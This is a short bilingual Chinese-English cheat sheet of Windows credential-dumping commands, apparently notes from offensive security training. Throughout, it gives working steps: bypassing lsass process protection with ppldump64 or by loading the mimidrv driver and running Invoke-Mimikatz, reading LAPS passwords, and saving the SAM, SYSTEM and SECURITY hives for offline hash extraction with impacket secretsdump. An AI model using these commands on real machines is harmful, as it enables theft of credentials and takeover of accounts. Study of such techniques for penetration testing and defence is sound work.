# windows

mimikatz

```
如果administrator or system have sedebug privilege
can use ppldump64.exe 来绕过ppl并 dump lsass

如果没有
那就用mimikatz

sc create mimidrv binPath=C:\Windows\system32\spool\drivers\color\mimidrv.sys type=kernel start=demand
sc start mimidrv

invoke-mimikatz          注意转义
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
```

离线抓取

```
本地的分为sam和laps两种
laps是明文但是要域内有读权限的用户才行

powerview里有读取laps的或者别的powershell框架里面也应该有的

sam

shadow copy

reg save HKLM\SYSTEM sys.hiv  
reg save HKLM\SAM C:\users\offsec.corp1\Downloads\sam  
reg save hklm\security security.hiv  

python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
```
